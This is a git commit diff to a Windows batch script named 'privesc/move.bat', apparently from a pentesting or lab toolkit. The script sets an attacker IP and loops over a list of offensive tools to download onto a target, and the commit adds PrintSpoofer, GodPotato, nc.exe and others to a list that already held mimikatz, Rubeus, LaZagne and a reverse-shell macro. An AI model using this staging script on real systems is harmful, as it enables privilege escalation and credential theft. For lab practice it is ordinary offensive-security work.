8972793121e28d9d073d7cdf90c3b789487aee4f
Zumi Yumi <150757931+ZumiYumi@users.noreply.github.com>
2025-01-03 16:50:41 -0800

    Update move.bat

--- scripts/privesc/move.bat
+++ scripts/privesc/move.bat
@@ -5,7 +5,7 @@ set myIP=10.10.14.189
 :: change your IP
 set destinationFolder=%USERPROFILE%\Downloads
 :: change your destinationFolder if you wish
-set files=powercat.ps1 pmap.ps1 PsMapExec.ps1 pmap.psd1 pmap.psm1 reverse_shell.vba config.Library-ms mimikatz.exe FullPowers.exe Rubeus.exe SafetyKatz.exe Seatbelt.exe winPEASany.exe PowerUp.ps1 jaws-enum.ps1 SessionGopher.ps1 LaZagne.exe binary.exe
+set files=powercat.ps1 pmap.ps1 PsMapExec.ps1 pmap.psd1 pmap.psm1 reverse_shell.vba config.Library-ms mimikatz.exe FullPowers.exe Rubeus.exe SafetyKatz.exe Seatbelt.exe winPEASany.exe PowerUp.ps1 jaws-enum.ps1 SessionGopher.ps1 LaZagne.exe binary.exe accesschk.exe PrintSpoofer64 PrintSpoofer32 socatx64.exe socatx86.exe GodPotato-Net2.exe GodPotato-Net35.exe GodPotato-Net4.exe nc.exe Watson.exe
 
 for %%f in (%files%) do (
     echo Downloading %%f...
